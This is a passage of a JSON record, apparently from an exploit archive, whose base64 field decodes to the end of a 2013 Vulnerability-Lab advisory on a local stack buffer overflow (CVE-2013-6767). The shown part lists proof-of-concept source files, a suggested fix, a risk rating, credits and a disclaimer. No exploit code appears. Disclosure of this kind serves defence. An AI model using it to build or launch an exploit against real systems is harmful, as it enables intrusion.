hlc2UgZmlsZXMgYXJlIHVzZWQgdG8gYnVpbGQgYSBwcmVjb21waWxlZCBoZWFkZXIgKFBDSCkgZmlsZQ0KbmFtZWQgU2hlbGxFeGVjdXRlRXhQcm9wZXJ0aWVzLnBjaCBhbmQgYSBwcmVjb21waWxlZCB0eXBlcyBmaWxlIG5hbWVkIFN0ZEFmeC5vYmouDQoNCk90aGVyIG5vdGVzOg0KQXBwV2l6YXJkIHVzZXMgIlRPRE86IiB0byBpbmRpY2F0ZSBwYXJ0cyBvZiB0aGUgc291cmNlIGNvZGUgeW91DQpzaG91bGQgYWRkIHRvIG9yIGN1c3RvbWl6ZS4NCg0KDQpSZXNvdXJjZShzKToNCgkJCQkuLi9TaGVsbEV4ZWN1dGVFeFByb3BlcnRpZXMvU2hlbGxFeGVjdXRlRXhQcm9wZXJ0aWVzLmNwcA0KCQkJCS4uL1NoZWxsRXhlY3V0ZUV4UHJvcGVydGllcy9TaGVsbEV4ZWN1dGVFeFByb3BlcnRpZXMuZHN3DQoJCQkJLi4vU2hlbGxFeGVjdXRlRXhQcm9wZXJ0aWVzL1NoZWxsRXhlY3V0ZUV4UHJvcGVydGllcy5vcHQNCgkJCQkuLi9TaGVsbEV4ZWN1dGVFeFByb3BlcnRpZXMvU2hlbGxFeGVjdXRlRXhQcm9wZXJ0aWVzLm5jYg0KCQkJCS4uL1NoZWxsRXhlY3V0ZUV4UHJvcGVydGllcy9TaGVsbEV4ZWN1dGVFeFByb3BlcnRpZXMucGxnDQoJCQkJLi4vU2hlbGxFeGVjdXRlRXhQcm9wZXJ0aWVzL1NoZWxsRXhlY3V0ZUV4UHJvcGVydGllcy5kc3ANCgkJCQkuLi9TaGVsbEV4ZWN1dGVFeFByb3BlcnRpZXMvU3RkQWZ4LmNwcA0KCQkJCS4uL1NoZWxsRXhlY3V0ZUV4UHJvcGVydGllcy9TdGRBZnguaA0KCQkJCS4uL1NoZWxsRXhlY3V0ZUV4UHJvcGVydGllcy9EZWJ1Zy9TaGVsbEV4ZWN1dGVFeFByb3BlcnRpZXMuZGxsDQoJCQkJLi4vU2hlbGxFeGVjdXRlRXhQcm9wZXJ0aWVzL0RlYnVnL1NoZWxsRXhlY3V0ZUV4UHJvcGVydGllcy5pbGsNCgkJCQkuLi9TaGVsbEV4ZWN1dGVFeFByb3BlcnRpZXMvRGVidWcvU2hlbGxFeGVjdXRlRXhQcm9wZXJ0aWVzLm9iag0KCQkJCS4uL1NoZWxsRXhlY3V0ZUV4UHJvcGVydGllcy9EZWJ1Zy9TaGVsbEV4ZWN1dGVFeFByb3BlcnRpZXMucGNoDQoJCQkJLi4vU2hlbGxFeGVjdXRlRXhQcm9wZXJ0aWVzL0RlYnVnL1NoZWxsRXhlY3V0ZUV4UHJvcGVydGllcy5wZGINCgkJCQkuLi9TaGVsbEV4ZWN1dGVFeFByb3BlcnRpZXMvRGVidWcvU3RkQWZ4Lm9iag0KCQkJCS4uL1NoZWxsRXhlY3V0ZUV4UHJvcGVydGllcy9EZWJ1Zy92YzYwLmlkYg0KCQkJCS4uL1NoZWxsRXhlY3V0ZUV4UHJvcGVydGllcy9EZWJ1Zy92YzYwLnBkYg0KDQoNCgkJCQkuLi9RSC1Qb0MuYw0KCQkJCS4uL1FILVBvQy5kc3ANCgkJCQkuLi9RSC1Qb0MuZHN3DQoJCQkJLi4vUUgtUG9DLm5jYg0KCQkJCS4uL1FILVBvQy5vcHQNCgkJCQkuLi9RSC1Qb0MucGxnDQoNCg0KU29sdXRpb24gLSBGaXggJiBQYXRjaDoNCj09PT09PT09PT09PT09PT09PT09PT09DQpUaGUgdnVsbmVyYWJpbGl0eSBjYW4gYmUgcGF0Y2hlZCBieSBhIHNlY3VyZSBmaWx0ZXIgYW5kIHNpemUgcmVzdHJpY3Rpb24gb2YgdGhlIFBFIGZpbGUgbmFtZSB0ZXh0IGZsYWcuDQoNCg0KU2VjdXJpdHkgUmlzazoNCj09PT09PT09PT09PT09DQpUaGUgc2VjdXJpdHkgcmlzayBvZiB0aGUgbG9jYWwgc3RhY2sgYnVmZmVyIG92ZXJmbG93IHZ1bG5lcmFiaWxpdHkgaXMgZXN0aW1hdGVkIGFzIG1lZGl1bSgrKS4NCg0KDQpDcmVkaXRzICYgQXV0aG9yczoNCj09PT09PT09PT09PT09PT09PQ0KQXJhc2ggQWxsZWJyYWhpbSAtIChHZW5pdXNfczNjX2ZpcmV3YWxsKCQkJCl5YWhvbygkJCQpY29tKQ0KDQoNCkRpc2NsYWltZXIgJiBJbmZvcm1hdGlvbjoNCj09PT09PT09PT09PT09PT09PT09PT09PT0NClRoZSBpbmZvcm1hdGlvbiBwcm92aWRlZCBpbiB0aGlzIGFkdmlzb3J5IGlzIHByb3ZpZGVkIGFzIGl0IGlzIHdpdGhvdXQgYW55IHdhcnJhbnR5LiBWdWxuZXJhYmlsaXR5IExhYiBkaXNjbGFpbXMgYWxsIHdhcnJhbnRpZXMsIA0KZWl0aGVyIGV4cHJlc3NlZCBvciBpbXBsaWVkLCBpbmNsdWRpbmcgdGhlIHdhcnJhbnRpZXMgb2YgbWVyY2hhbnRhYmlsaXR5IGFuZCBjYXBhYmlsaXR5IGZvciBhIHBhcnRpY3VsYXIgcHVycG9zZS4gVnVsbmVyYWJpbGl0eS0NCkxhYiBvciBpdHMgc3VwcGxpZXJzIGFyZSBub3QgbGlhYmxlIGluIGFueSBjYXNlIG9mIGRhbWFnZSwgaW5jbHVkaW5nIGRpcmVjdCwgaW5kaXJlY3QsIGluY2lkZW50YWwsIGNvbnNlcXVlbnRpYWwgbG9zcyBvZiBidXNpbmVzcyANCnByb2ZpdHMgb3Igc3BlY2lhbCBkYW1hZ2VzLCBldmVuIGlmIFZ1bG5lcmFiaWxpdHktTGFiIG9yIGl0cyBzdXBwbGllcnMgaGF2ZSBiZWVuIGFkdmlzZWQgb2YgdGhlIHBvc3NpYmlsaXR5IG9mIHN1Y2ggZGFtYWdlcy4gU29tZSANCnN0YXRlcyBkbyBub3QgYWxsb3cgdGhlIGV4Y2x1c2lvbiBvciBsaW1pdGF0aW9uIG9mIGxpYWJpbGl0eSBmb3IgY29uc2VxdWVudGlhbCBvciBpbmNpZGVudGFsIGRhbWFnZXMgc28gdGhlIGZvcmVnb2luZyBsaW1pdGF0aW9uIA0KbWF5IG5vdCBhcHBseS4gV2UgZG8gbm90IGFwcHJvdmUgb3IgZW5jb3VyYWdlIGFueWJvZHkgdG8gYnJlYWsgYW55IHZlbmRvciBsaWNlbnNlcywgcG9saWNpZXMsIGRlZmFjZSB3ZWJzaXRlcywgaGFjayBpbnRvIGRhdGFiYXNlcyANCm9yIHRyYWRlIHdpdGggZnJhdWQvc3RvbGVuIG1hdGVyaWFsLg0KDQpEb21haW5zOiAgICB3d3cudnVsbmVyYWJpbGl0eS1sYWIuY29tICAgCS0gd3d3LnZ1bG4tbGFiLmNvbQkJCSAgICAgICAtIHd3dy5ldm9sdXRpb24tc2VjLmNvbQ0KQ29udGFjdDogICAgYWRtaW5AdnVsbmVyYWJpbGl0eS1sYWIuY29tIAktIHJlc2VhcmNoQHZ1bG5lcmFiaWxpdHktbGFiLmNvbSAJICAgICAgIC0gYWRtaW5AZXZvbHV0aW9uLXNlYy5jb20NClNlY3Rpb246ICAgIHd3dy52dWxuZXJhYmlsaXR5LWxhYi5jb20vZGV2IAktIGZvcnVtLnZ1bG5lcmFiaWxpdHktZGIuY29tIAkJICAgICAgIC0gbWFnYXppbmUudnVsbmVyYWJpbGl0eS1kYi5jb20NClNvY2lhbDoJICAgIHR3aXR0ZXIuY29tLyMhL3Z1bG5fbGFiIAkJLSBmYWNlYm9vay5jb20vVnVsbmVyYWJpbGl0eUxhYiAJICAgICAgIC0geW91dHViZS5jb20vdXNlci92dWxuZXJhYmlsaXR5MGxhYg0KRmVlZHM6CSAgICB2dWxuZXJhYmlsaXR5LWxhYi5jb20vcnNzL3Jzcy5waHAJLSB2dWxuZXJhYmlsaXR5LWxhYi5jb20vcnNzL3Jzc191cGNvbWluZy5waHAgICAtIHZ1bG5lcmFiaWxpdHktbGFiLmNvbS9yc3MvcnNzX25ld3MucGhwDQoNCkFueSBtb2RpZmllZCBjb3B5IG9yIHJlcHJvZHVjdGlvbiwgaW5jbHVkaW5nIHBhcnRpYWxseSB1c2FnZXMsIG9mIHRoaXMgZmlsZSByZXF1aXJlcyBhdXRob3JpemF0aW9uIGZyb20gVnVsbmVyYWJpbGl0eSBMYWJvcmF0b3J5LiANClBlcm1pc3Npb24gdG8gZWxlY3Ryb25pY2FsbHkgcmVkaXN0cmlidXRlIHRoaXMgYWxlcnQgaW4gaXRzIHVubW9kaWZpZWQgZm9ybSBpcyBncmFudGVkLiBBbGwgb3RoZXIgcmlnaHRzLCBpbmNsdWRpbmcgdGhlIHVzZSBvZiBvdGhlciANCm1lZGlhLCBhcmUgcmVzZXJ2ZWQgYnkgVnVsbmVyYWJpbGl0eS1MYWIgUmVzZWFyY2ggVGVhbSBvciBpdHMgc3VwcGxpZXJzLiBBbGwgcGljdHVyZXMsIHRleHRzLCBhZHZpc29yaWVzLCBzb3VyY2UgY29kZSwgdmlkZW9zIGFuZCANCm90aGVyIGluZm9ybWF0aW9uIG9uIHRoaXMgd2Vic2l0ZSBpcyB0cmFkZW1hcmsgb2YgdnVsbmVyYWJpbGl0eS1sYWIgdGVhbSAmIHRoZSBzcGVjaWZpYyBhdXRob3JzIG9yIG1hbmFnZXJzLiBUbyByZWNvcmQsIGxpc3QgKGZlZWQpLCANCm1vZGlmeSwgdXNlIG9yIGVkaXQgb3VyIG1hdGVyaWFsIGNvbnRhY3QgKGFkbWluQHZ1bG5lcmFiaWxpdHktbGFiLmNvbSBvciByZXNlYXJjaEB2dWxuZXJhYmlsaXR5LWxhYi5jb20pIHRvIGdldCBhIHBlcm1pc3Npb24uDQoNCgkJCQlDb3B5cmlnaHQgwqkgMjAxMyB8IFZ1bG5lcmFiaWxpdHkgTGFib3JhdG9yeSBbRXZvbHV0aW9uIFNlY3VyaXR5XQ0KDQoNCg0KLS0gDQpWVUxORVJBQklMSVRZIExBQk9SQVRPUlkgUkVTRUFSQ0ggVEVBTQ0KRE9NQUlOOiB3d3cudnVsbmVyYWJpbGl0eS1sYWIuY29tDQpDT05UQUNUOiByZXNlYXJjaEB2dWxuZXJhYmlsaXR5LWxhYi5jb20=", 
    "filename": "platforms/windows/local/30374.txt", 
    "id": "30374", 
    "cves": [
        "CVE-2013-6767"
    ]
}